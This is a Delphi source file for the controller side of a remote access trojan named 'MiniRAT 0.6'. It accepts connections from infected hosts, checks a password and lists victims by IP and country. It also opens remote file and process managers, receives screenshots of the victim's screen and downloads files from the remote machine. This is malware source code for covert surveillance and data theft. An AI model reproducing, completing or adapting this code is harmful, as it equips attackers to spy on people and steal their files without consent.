unit uConn;

interface
uses Windows,Classes,sysUtils,Winsock,ComCtrls, StdCtrls, ExtCtrls,jpeg, uScreen,uProcess;
type
  TConnThread = class(TThread)
  private
    ConnSock:Integer;
    TransSocket:Integer;
    TempSocket:Integer;
    TransSize:Integer;
    TransName:string;
    tsListitem:TListItem;
    TransferedSize:Integer;
    TransSpeed:Integer;
    TransTimeLeft:string;
    tTempScreen:Tform4;
  protected
    procedure Execute; override;
  public
    constructor Create(CreateSuspended: Boolean);
    procedure SetSocket(sValue: Integer);
    Function ListenHost:DWord;
    Function Explode(sDelimiter: String; sSource: String): TStringList;
    procedure HandleTerminate(Sender: TObject);
    procedure TransFile();
    procedure AddtoList();
    procedure DelFromList();
    procedure UpdateList();
    procedure GetTimeLeft();
    procedure TransScreen();
    procedure GetForm4();
    procedure SetStatus();
  end;
implementation
uses uSettings, mainU, uFlag, uFilemanager,uTransferView;
Function GetPath: String;
Begin
  Result := ExtractFilePath(ParamStr(0)) + 'Downloads\';
  If (Not DirectoryExists(Result)) Then
    CreateDirectory(pChar(Result), NIL);
End;

procedure TConnThread.SetSocket(sValue: Integer);
begin
  ConnSock := sValue;
end;

Function RemoteAddr(Sock: TSocket): TSockAddrIn;
Var
  W     :TWSAData;
  S     :TSockAddrIn;
  I     :Integer;
Begin
  WSAStartUP($0202, W);
  I := SizeOf(S);
  GetPeerName(Sock, S, I);
  WSACleanUP();
  Result := S;
End;
procedure TConnThread.GetTimeLeft();
Var
  dDay  :Integer;
  dHour :Integer;
  dMin  :Integer;
  dSec  :Integer;
  dTmp  :Integer;
  dTmp2 :Integer;
Begin
  If TransSpeed = 0 Then Exit;
  If Transferedsize = 0 Then Exit;

  dDay := 0; dHour := 0; dMin := 0;
  dTmp2 := 0; dTmp := 0;

  While dTmp2 <= (transsize - Transferedsize) Do
  Begin
    Inc(dTmp2, TransSpeed);
    Inc(dTmp, 1);
  End;

  dSec := dTmp;

  If dSec > 60 Then
    repeat
      dec(dSec, 60);
      inc(dMin, 1);
    until dSec < 60;

  If dMin > 60 Then
    repeat
      dec(dMin, 60);
      inc(dHour, 1);
    until dMin < 60;

  If dHour > 24 Then
    repeat
      dec(dHour, 24);
      inc(dDay, 1);
    until dHour < 24;

  TransTimeLeft := IntToStr(dDay)  + 'd '+
            IntToStr(dHour) + 'h '+
            IntToStr(dMin)  + 'm '+
            IntToStr(dSec)  + 's';
End;
Function RemoteAddress(Sock: TSocket): String;
Begin
  Result := INET_NTOA(RemoteAddr(Sock).sin_addr);
End;
procedure TConnThread.DelFromList();
begin
tsListitem.Delete;
end;

Function RemotePort(Sock: TSocket): String;
Begin
  Result := IntToStr(nTohs(RemoteAddr(Sock).sin_port));
End;

procedure TConnThread.UpdateList();
var
  smd:extended;
begin
smd := TransferedSize / TransSize;
tsListitem.SubItems.Strings[1] := IntToStr(trunc(smd * 100)) + ' %';
tsListitem.SubItems.Strings[2] := TransTimeLeft;
end;

procedure TConnThread.AddtoList();
begin
tsListitem := Form3.lv1.Items.Add;
tsListitem.Caption := Transname;
tsListitem.SubItems.Add(IntToStr(TransSize));
tsListitem.SubItems.Add('0 %');
tsListitem.SubItems.Add('-');
tsListitem.SubItems.Add('Downloading');
tsListitem.ImageIndex := 0;
end;

Function SendData(Sock: TSocket; Text: String): Integer;
Begin
  Result := Send(Sock, Text[1], Length(Text), 0);
End;

procedure TConnThread.HandleTerminate(Sender: TObject);
var i:Integer;
begin
  for i := 0 to MainForm.lv1.Items.Count -1 do begin
    if mainform.lv1.Items.Item[i].SubItems.Strings[0] = IntToStr(ConnSock) then begin
      mainform.lv1.Items.Item[i].Delete;
      Exit;
    end;
  end;
  MainForm.Caption := 'MiniRAT 0.6 - Connected Users: ' + IntToStr(MainForm.lv1.Items.Count);
end;

constructor TConnThread.Create(CreateSuspended: Boolean);
begin
  inherited;
  ConnSock := 0;
end;

procedure TConnThread.Execute;
begin
  FreeOnTerminate:=True;
  OnTerminate := HandleTerminate;
  ListenHost;
end;

Function TConnThread.Explode(sDelimiter: String; sSource: String): TStringList;
Var
  c: Word;
Begin
  Result := TStringList.Create;
  C := 0;

  While sSource <> '' Do
  Begin
    If Pos(sDelimiter, sSource) > 0 Then
    Begin
      Result.Add(Copy(sSource, 1, Pos(sDelimiter, sSource) - 1 ));
      Delete(sSource, 1, Length(Result[c]) + Length(sDelimiter));
    End
    Else
    Begin
      Result.Add(sSource);
      sSource := ''
    End;

    Inc(c);
  End;
End;

procedure TConnThread.GetForm4();
var
  f:Integer;
begin
for f := 0 to MainForm.lv1.Items.Count -1 do begin
    if MainForm.lv1.Items.Item[f].SubItems.Strings[0]= IntToStr(TempSocket) then begin
       tTempScreen := TForm4(mainform.lv1.items.item[f].subitems.Objects[1]);
       Exit;
    end;
end;
end;

procedure TConnThread.SetStatus();
begin
tTempScreen.pb1.Position := TransSize;
  tTempScreen.pb1.Position := TransferedSize;
end;

procedure TConnThread.TransScreen();
var
  h:tmemorystream;
  BytesSize:Cardinal;
  T:String;
  Total:Integer;
  rFile:Array[0..8000] Of Char;
  dErr:Integer;
  jpg: TJpegimage;
Label
  Disconnected,
  Finished;
begin
  Synchronize(getform4);
  h := TMemoryStream.Create;
  TransferedSize := 0;
  Synchronize(setstatus);
  BytesSize := 0;
  T := 'ok';
  If (BytesSize < TransSize) Then
  Begin
    Total := 1;
    Repeat
      FillChar(rFile, SizeOf(rFile), 0);
      dErr := Recv(Transsocket, rFile, SizeOf(rFile), 0);
      If dErr = -1 Then Break;
      if TransSize < (derr + total) then begin
        h.Write(rFile,TransSize - total + 1);
        tTempScreen.pb1.Position := TransSize;
        Inc(Total, derr);
      end else begin
        Inc(Total, dErr);
        h.Write(rFile,dErr);
        tTempScreen.pb1.Position := total;
      end;
      TransferedSize := Total;
      Send(Transsocket, t[1], length(t), 0);
    Until (Total >= TransSize);
    Goto Finished;
  End Else
    Goto Finished;

Disconnected:
  Sleep(1000);
  Goto Finished;

Finished:
  h.Seek(0,sofromBeginning);
  jpg := TJpegimage.Create;
  jpg.LoadFromStream(h);
  tTempScreen.img1.Picture.Assign(jpg);
  h.Free;
  jpg.Free;
  if tTempScreen.sStop = false then
  tTempScreen.btn1.Enabled := false;
end;

procedure TConnThread.TransFile();
var
  F:THandle;
  BytesSize:Cardinal;
  T:String;
  Total:Integer;
  Start:Integer;
  rFile:Array[0..8000] Of Char;
  dErr:Integer;
  BytesWritten:Cardinal;
Label
  Disconnected,
  Finished;
begin
  Synchronize(AddtoList);
  F := CreateFile(pChar(GetPath+TransName), GENERIC_WRITE, FILE_SHARE_WRITE, NIL, CREATE_NEW, 0, 0);
  BytesSize := 0;
  SetFilePointer(F, 0, NIL, FILE_END);
  T := 'ok';
  If (BytesSize < TransSize) Then
  Begin
    Start := GetTickCount;
    Total := 1;
    Repeat
      FillChar(rFile, SizeOf(rFile), 0);
      dErr := Recv(Transsocket, rFile, SizeOf(rFile), 0);
      If dErr = -1 Then Break;
      if TransSize < (derr + total) then begin
        SetFilePointer(F, 0, NIL, FILE_END);
        WriteFile(F, rFile, TransSize - total + 1, BytesWritten, NIL);
        Inc(Total, derr);
      end else begin
        Inc(Total, dErr);
        SetFilePointer(F, 0, NIL, FILE_END);
        WriteFile(F, rFile, dErr, BytesWritten, NIL);
      end;
      TransferedSize := Total;
      TransSpeed := Total DIV (((GetTickCount() - Start) DIV 1000) + 1);
      Synchronize(GetTimeLeft);
      Synchronize(updatelist);
      Send(Transsocket, t[1], length(t), 0);
    Until (Total >= TransSize);
    Goto Finished;
  End Else
    Goto Finished;

Disconnected:
  Sleep(1000);
  Goto Finished;

Finished:
  CloseHandle(F);
  Synchronize(delfromlist);
  Sleep(1000);
  //closesocket(TransSocket);
end;

Function TConnThread.ListenHost:DWord;
label Disconnect;
Var
  Address, Port :String;
  Sock: TSocket;
  Buffer: Array[0..1600] Of Char;
  Data: String;
  Len: Integer;
  Temp: String;
  Cmd: String;
  pStrList :tstringlist;
  cStrList:TStringList;
  I: Word;
  sItem: TListItem;
  saItem:TListItem;
  sFileman :TForm2;
  sProcman:TForm5;
  sDat:string;
Begin
  Sock := ConnSock;
  Address := RemoteAddress(Sock);
  Port := RemotePort(Sock);
  sDat := '';
  Repeat

    //Time.tv_sec := 120;
    //Time.tv_usec := 0;

    //FD_ZERO(FDS);
    //FD_SET(Sock, FDS);
    //If Select(0, @FDS, NIL, NIL, @TIME) <= 0 Then Break;
    Len := Recv(Sock, Buffer, 1600, 0);
    If (Len <= 0) Then Break;
    Data := String(Buffer);
    ZeroMemory(@Buffer, SizeOf(Buffer));
    sDat := sDat + Data;
    if Copy(sDat,Length(sdat),1) = #10 then begin
      Temp := Copy(sDat, 1, Pos(#10, sDat)-1);
      pStrList := Explode('|',Temp);
      cmd := pStrList.Strings[0];
        if cmd = '01' then begin
          if pStrList.Strings[1] <> form1.edt2.Text then begin
            Break;
          end;
        end;

        if Cmd = '02' then begin
          sItem := mainform.lv1.Items.Add;
          sItem.Caption := Address;
          sItem.SubItems.Add(inttostr(sock));
          sItem.SubItems.Add(pStrList.Strings[1]);
          sItem.SubItems.Add(GetCountry(pStrList.Strings[3]));
          sItem.SubItems.Add(pStrList.Strings[2]);
          sItem.ImageIndex := GetFlag(pStrList.Strings[3]);
          MainForm.Caption := 'MiniRAT 0.6 - Connected Users: ' + IntToStr(MainForm.lv1.Items.Count);
        end;

        if cmd = '12' then begin
            if sItem.SubItems.Objects[0] <> nil then begin
              TForm2(sItem.SubItems.Objects[0]).Show;
            end else begin
              sFileman := tform2.Create(nil);
              sFileman.Show;
              sFileman.Caption := 'Filemanager - ' +  sItem.SubItems.Strings[1];
              sFileman.stat1.Panels.Items[0].Text := sItem.SubItems.Strings[0];
              sFileman.stat1.Panels.Items[1].Text := sItem.Caption;
              sFileman.cbb1.Clear;
              sItem.SubItems.Objects[0] := sFileman;
            end;
            for i := 1 to pStrList.Count - 1 do begin
              TForm2(sItem.SubItems.Objects[0]).cbb1.AddItem(pStrList.Strings[i],nil);
            end;
        end;

        if cmd = '16' then begin
           if sItem.SubItems.Objects[2] <> nil then begin
           TForm5(sItem.SubItems.Objects[2]).Show;
          end else begin
            sProcman := tform5.Create(nil);
            sProcman.Show;
            sProcman.Caption := 'Processmanager - ' +  sItem.SubItems.Strings[1];
            sProcman.stat1.Panels.Items[0].Text := sItem.SubItems.Strings[0];
            sProcman.stat1.Panels.Items[1].Text := sItem.Caption;
            sProcman.lv1.Clear;
            sItem.SubItems.Objects[2] := sFileman;
          end;
          TForm5(sItem.SubItems.Objects[2]).lv1.Enabled := false;
          TForm5(sItem.SubItems.Objects[2]).lv1.Items.BeginUpdate;
          for i := 1 to pStrList.Count - 1 do begin
            cStrList := Explode('#',pStrList.Strings[i]);

              saItem := TForm5(sItem.SubItems.Objects[2]).lv1.Items.Add;
              saItem.Caption := cStrList.Strings[2];
              saItem.SubItems.Add(cStrList.Strings[1]);
              saItem.SubItems.Add(cStrList.Strings[0]);
          end;
          TForm5(sItem.SubItems.Objects[2]).lv1.Items.endUpdate;
          TForm5(sItem.SubItems.Objects[2]).lv1.Enabled := true;
        end;

        if Cmd = '18' then begin
          if sItem.SubItems.Objects[0] <> nil then begin
           TForm2(sItem.SubItems.Objects[0]).Show;
          end else begin
            sFileman := tform2.Create(nil);
            sFileman.Show;
            sFileman.Caption := 'Filemanager - ' +  sItem.SubItems.Strings[1];
            sFileman.stat1.Panels.Items[0].Text := sItem.SubItems.Strings[0];
            sFileman.stat1.Panels.Items[1].Text := sItem.Caption;
            sFileman.cbb1.Clear;
            sItem.SubItems.Objects[0] := sFileman;
          end;
          TForm2(sItem.SubItems.Objects[0]).lv1.Enabled := false;
          TForm2(sItem.SubItems.Objects[0]).lv1.Items.BeginUpdate;
          for i := 1 to pStrList.Count - 1 do begin
            cStrList := Explode('#',pStrList.Strings[i]);
            If (cStrList.Strings[2] <> '.') Then
            Begin
              saItem := TForm2(sItem.SubItems.Objects[0]).lv1.Items.Add;
              saItem.Caption := cStrList.Strings[2];
             If (cStrList.Strings[2] = '..') Then begin
                  saItem.SubItems.Add('Go Back');
                  saItem.ImageIndex := 2;
                  saItem.SubItems.Add(' ');
             end else begin
               If (cStrList.Strings[0] = 'DIR') Then begin
                 saItem.ImageIndex := 0;
               end else begin
                 saItem.ImageIndex := 1;
               end;
               saItem.SubItems.Add(cStrList.Strings[0]);
               saItem.SubItems.Add(cStrList.Strings[1] + ' Bytes');
             end;
            end;
          end;
          TForm2(sItem.SubItems.Objects[0]).lv1.Items.endUpdate;
          TForm2(sItem.SubItems.Objects[0]).lv1.Enabled := true;
        end;

        if cmd = '24' then begin
          TransSize := StrToInt(pStrList.Strings[2]);
          Tempsocket :=  strtoint(pStrList.Strings[3]);
          TransSocket:= Sock;
          TransScreen;
          Break;
        end;
        
        if cmd = '26' then begin
          TransSize := StrToInt(pStrList.Strings[1]);
          TransName :=  ExtractFileName(pStrList.Strings[2]);
          TransSocket := Sock;
          TransFile;
          Break;
        end;
      sDat := '';
    end;

  Until 1 = 2;
  sItem.Delete;
  MainForm.Caption := 'MiniRAT 0.6 - Connected Users: ' + IntToStr(MainForm.lv1.Items.Count);
  Disconnect:
  ZeroMemory(@I, SizeOf(I));
  CloseSocket(Sock);
  //RemoveUser(Address, Port);
  //KillThread(getcurrentthreadid);
End;
end.

